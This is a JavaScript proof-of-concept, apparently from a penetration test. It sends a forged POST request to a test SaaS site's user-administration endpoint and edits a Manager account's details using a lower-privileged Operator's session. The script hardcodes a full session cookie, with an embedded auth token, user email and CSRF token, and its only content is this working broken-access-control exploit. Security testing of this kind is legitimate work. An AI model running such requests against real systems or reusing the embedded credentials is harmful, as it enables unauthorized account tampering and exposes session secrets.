// Crear una nueva instancia de XMLHttpRequest
var xhr = new XMLHttpRequest();
// Configurar la petición con el método POST y la URL adecuada
xhr.open("POST", "https://bp-saas-tst.sin-cola.com/user_admin/edit_user_ajax", true);

// Configurar las cabeceras necesarias
xhr.setRequestHeader("Cookie", "_web_session=eyJzZXNzaW9uX2lkIjoiYzEwZTc1Nzc4NmZjM2VmMTIwOWMxZTkwODU1NzRhZTAiLCJmb3JtIjp7fSwiX2NzcmZfdG9rZW4iOiJoKzFYK2s4K2YvWEwrdUlhVHVNNlkrNEN1cFcwaTBuYWNTUDJsN2VLajZvPSIsInVzZXJfZW1haWwiOiJicnVubytvcGVyYWRvcjFAaGFja2VtdHJpeC5jb20iLCJjbGllbnRfc2V0dGluZ3MiOlt7InNldHRpbmdfY2xpZW50X29wZXJhdG9yIjp7ImlkIjozLCJjbGllbnRfaWQiOjEsIm9wZXJhdG9yX2lkIjpudWxsLCJuYW1lIjoiaGlkZV9vcGVyYXRlZF9nYXRlc192aWV3IiwidmFsdWUiOiJmYWxzZSIsImRlc2NyaXB0aW9uIjpudWxsfX0seyJzZXR0aW5nX2NsaWVudF9vcGVyYXRvciI6eyJpZCI6NCwiY2xpZW50X2lkIjoxLCJvcGVyYXRvcl9pZCI6bnVsbCwibmFtZSI6ImhpZGVfbXlfc2VydmljZV9wcm92aWRlcl92aWV3IiwidmFsdWUiOiJmYWxzZSIsImRlc2NyaXB0aW9uIjpudWxsfX0seyJzZXR0aW5nX2NsaWVudF9vcGVyYXRvciI6eyJpZCI6NSwiY2xpZW50X2lkIjoxLCJvcGVyYXRvcl9pZCI6bnVsbCwibmFtZSI6ImhpZGVfbXlfbGluZXNfdmlldyIsInZhbHVlIjoiZmFsc2UiLCJkZXNjcmlwdGlvbiI6bnVsbH19LHsic2V0dGluZ19jbGllbnRfb3BlcmF0b3IiOnsiaWQiOjYsImNsaWVudF9pZCI6MSwib3BlcmF0b3JfaWQiOm51bGwsIm5hbWUiOiJoaWRlX215X2F0dGVuZGVkX3RpY2tldHNfdmlldyIsInZhbHVlIjoiZmFsc2UiLCJkZXNjcmlwdGlvbiI6bnVsbH19LHsic2V0dGluZ19jbGllbnRfb3BlcmF0b3IiOnsiaWQiOjcsImNsaWVudF9pZCI6MSwib3BlcmF0b3JfaWQiOm51bGwsIm5hbWUiOiJoaWRlX215X2FwcG9pbnRtZW50c192aWV3IiwidmFsdWUiOiJmYWxzZSIsImRlc2NyaXB0aW9uIjpudWxsfX1dLCJzaG93X3NlbGZfYXR0ZW50aW9uX3RpY2tldF9zd2l0Y2giOmZhbHNlLCJwYXNzd29yZF92YWxpZGl0eSI6dHJ1ZSwiZXh0ZXJuYWxfbG9naW4iOmZhbHNlLCJ1c2VyX2RhdGEiOnsidXNlciI6eyJpZCI6Mzc1MywiZmlyc3RfbmFtZSI6IkJydW5vIiwibGFzdF9uYW1lIjoib3BlcmFkb3JUZXN0IiwiZW1haWwiOiJicnVubytvcGVyYWRvcjFAaGFja2VtdHJpeC5jb20iLCJhZGRyZXNzIjpudWxsLCJwaG9uZV9udW1iZXIiOm51bGwsIm5pY2tuYW1lIjpudWxsLCJ0eXBlIjoiT3BlcmF0b3IiLCJ0aW1lX3pvbmUiOiJBbWVyaWNhL0NhcmFjYXMiLCJhY3RpdmUiOnRydWUsImxhc3RfcGFzc3dvcmRfY2hhbmdlIjoiMjAyNC0wNS0xNlQxNzowNToyMloifX0sInNldHRpbmdfY2xpZW50X2lkIjoxLCJzZXR0aW5nX29wZXJhdG9yX2lkIjozNzUzLCJvcGVyYXRvcl9zZXR0aW5ncyI6W10sIm1hbmFnZXJfb3BlcmF0b3IiOmZhbHNlLCJhdXRoX3Rva2VuIjoicU1tOU42VnFlallHZEZzQVpVaUgiLCJjdXJyZW50X3JvbGUiOiJvcGVyYXRvciJ9--e8d88b9d868f526cf9234eea9cfeea54dbe4e037");
xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0");
xhr.setRequestHeader("Accept", "*/*");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
xhr.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
xhr.setRequestHeader("Referer", "https://bp-saas-tst.sin-cola.com/");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
xhr.setRequestHeader("X-Csrf-Token", "4Q4XPrFI9UBgG1wvz5BcuYPM44A5mpV7EqIPNDwpXJZm40DE/naKtavhvjWBc2babc5ZFY0R3KFjgfmji6PTPA==");
xhr.setRequestHeader("Origin", "https://bp-saas-tst.sin-cola.com");
xhr.setRequestHeader("Sec-Fetch-Dest", "empty");
xhr.setRequestHeader("Sec-Fetch-Mode", "cors");
xhr.setRequestHeader("Sec-Fetch-Site", "same-origin");
xhr.setRequestHeader("Hackmetrix-Pentest", "true");

// Preparar los datos del formulario
var params = "utf8=%E2%9C%93&%2Fuser_admin%2Fedit_user_ajax%5Bfirst_name%5D=Manager+modifiedWithJS&%2Fuser_admin%2Fedit_user_ajax%5Bid%5D=3&%2Fuser_admin%2Fedit_user_ajax%5Blast_name%5D=Sede+Principal&%2Fuser_admin%2Fedit_user_ajax%5Bdocument_number%5D=&original_document_number=&%2Fuser_admin%2Fedit_user_ajax%5Bemail%5D=manager-ppal@sin-cola.com&original_email=&%2Fuser_admin%2Fedit_user_ajax%5Bphone_number%5D=&%2Fuser_admin%2Fedit_user_ajax%5Baddress%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bnickname%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bactive%5D=true&%2Fuser_admin%2Fedit_user_ajax%5Btype%5D=Manager&branches%5B%5D=1&%2Fuser_admin%2Fedit_user_ajax%5Bhierarchy%5D=&%2Fuser_admin%2Fedit_user_ajax%5Bdivision%5D=";

xhr.withCredentials = true;
// Asignar una función de callback para manejar la respuesta
xhr.onreadystatechange = function() {
  if (xhr.readyState === XMLHttpRequest.DONE) {
    if (xhr.status === 200) {
      console.log("Response received: ", xhr.responseText);
    } else {
      console.error("Error: ", xhr.statusText);
    }
  }
};

// Enviar la petición con los datos
xhr.send(params);
